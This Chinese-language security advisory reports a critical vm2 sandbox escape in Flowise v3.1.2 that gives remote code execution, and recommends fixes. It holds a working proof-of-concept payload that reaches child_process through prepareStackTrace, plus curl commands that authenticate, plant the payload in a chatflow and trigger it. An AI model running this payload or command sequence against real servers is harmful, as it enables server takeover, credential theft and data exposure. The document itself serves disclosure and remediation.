# V-F001: Flowise vm2 废弃沙箱逃逸导致 RCE

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | Flowise（开源 LLM 流程编排平台）|
| 版本 | v3.1.2（截至 2026-04）|
| 类型 | CWE-94: 代码注入 / 沙箱逃逸 → RCE |
| 严重程度 | 严重（Critical）|
| 攻击向量 | 网络（已认证，任意普通用户）|
| 关联 CVE | CVE-2023-29017、CVE-2023-30547、CVE-2023-32314（vm2 公开逃逸） |
| 代码仓库 | https://github.com/flowiseai/flowise |

## 漏洞描述

Flowise 使用 **vm2 v3.10.5** 来沙箱化用户提交的 JavaScript 代码（CustomFunction 节点、Custom Tool 节点）。vm2 已于 2023-09-12 正式宣告停止维护，维护者声明"无法安全沙箱化 Node.js 内置模块"，并发布了多个 CVSS 9.8 的公开漏洞。

Flowise 仍锁定使用该废弃版本，任何拥有 `chatflows:create` 权限的已认证用户均可通过提交沙箱逃逸代码，在服务器进程上下文中执行任意系统命令。

## 漏洞代码

**文件**：`packages/components/src/utils.ts`（第 1769-1808 行）

```typescript
// 第 1769 行：构建默认安全选项
const defaultNodeVMOptions: any = {
    console: 'inherit',
    sandbox,
    require: {
        external: { modules: deps, transitive: false },
        builtin: builtinDeps,   // 允许访问 ['assert','buffer','crypto','events','path',...]
        mock: secureWrappers
    },
    eval: false,
    wasm: false,
    timeout: timeoutMs
}

// ⚠️ 第 1786 行：调用方传入的 nodeVMOptions 可覆盖全部安全配置
const finalNodeVMOptions = { ...defaultNodeVMOptions, ...nodeVMOptions }

// 第 1788 行：用最终（可能已被覆盖）的配置创建 vm
const vm = new NodeVM(finalNodeVMOptions)

// 第 1791 行：直接执行用户提交的 code
const response = await vm.run(
    `module.exports = async function() {${code}}()`,
    __dirname
)
```

**加剧因素**：`availableDependencies`（第 54-122 行）包含 `playwright`、`puppeteer`、`typeorm`、`mysql2`、`pg`、`@aws-sdk/*` 等高危模块，这些模块可在沙箱逃逸后作为跳板。

## 利用方式

### 攻击路径

1. 攻击者持有任意已登录账户
2. 创建或更新包含 **CustomFunction** 节点的 Chatflow
3. 在节点代码中提交 CVE-2023-29017 逃逸 payload
4. 执行 Chatflow，`NodeVM.run(code)` 被触发
5. 沙箱逃逸，获得服务器 `process` 对象，执行任意 OS 命令

### PoC（CVE-2023-29017，公开漏洞）

```javascript
// 在 CustomFunction 节点中提交以下代码：
const err = new Error();
err.__proto__.prepareStackTrace = (e, frames) => {
    const f = frames[0].getThis();
    const cmd = f.constructor.constructor('return process')();
    return cmd.mainModule.require('child_process').execSync('id').toString();
};
err.stack;
```

通过 API 直接触发：

```bash
# 1. 登录获取 Token（若开启认证）
TOKEN=$(curl -s -X POST http://<target>:3000/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"user@example.com","password":"P@ssw0rd"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['accessToken'])")

# 2. 创建含恶意代码的 Chatflow
curl -X POST http://<target>:3000/api/v1/chatflows \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "pwn",
    "flowData": "{\"nodes\":[{\"id\":\"customFunction_0\",\"data\":{\"name\":\"customFunction\",\"inputs\":{\"functionCode\":\"const err=new Error();err.__proto__.prepareStackTrace=(e,frames)=>{const f=frames[0].getThis();const c=f.constructor.constructor('"'"'return process'"'"')();return c.mainModule.require('"'"'child_process'"'"').execSync('"'"'id'"'"').toString();};err.stack;\"}}}]}"
  }'

# 3. 也可通过无认证的 prediction 接口直接触发（若 Chatflow 为公开）
curl -X POST http://<target>:3000/api/v1/prediction/<chatflowId> \
  -H 'Content-Type: application/json' \
  -d '{"question":"run"}'
```

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `packages/components/src/utils.ts` | 21 | `import { NodeVM } from 'vm2'` |
| `packages/components/src/utils.ts` | 1786 | `nodeVMOptions` 展开合并可覆盖安全配置 |
| `packages/components/src/utils.ts` | 1791 | `vm.run(code, __dirname)` 执行用户代码 |
| `pnpm-lock.yaml` | 15119 | 锁定 vm2 废弃版本 |

## 影响

1. **服务器完全沦陷**：以 Node.js 进程权限执行任意 OS 命令
2. **容器逃逸风险**：若容器以 root 运行或挂载 Docker Socket，可逃逸至宿主机
3. **凭据窃取**：读取 `.env` 文件、数据库连接字符串、API Key 等
4. **横向移动**：利用 `@aws-sdk/*`、`typeorm` 等依赖访问云资源或内部数据库
5. **数据泄露**：读取 Flowise 数据库中存储的所有 Chatflow、凭据、用户数据

## 修复建议

1. **立即**：将 vm2 替换为 `isolated-vm`（V8 Isolate 级隔离，无已知逃逸）：
   ```typescript
   import ivm from 'isolated-vm'
   const isolate = new ivm.Isolate({ memoryLimit: 128 })
   const context = await isolate.createContext()
   const script = await isolate.compileScript(code)
   await script.run(context)
   ```
2. **立即**：移除第 1786 行的 `...nodeVMOptions` 展开合并，固定安全配置不可从外部覆盖
3. **短期**：大幅缩减 `availableDependencies` 白名单，删除 `playwright`、`puppeteer`、数据库驱动等高危模块
4. **长期**：将代码执行功能迁移到独立容器（gVisor / Firecracker），与主进程完全隔离

## 验证环境

- 源代码：Flowise v3.1.2（静态代码分析）
- 框架：Node.js + Express + vm2 3.10.5
- 日期：2026-04-15
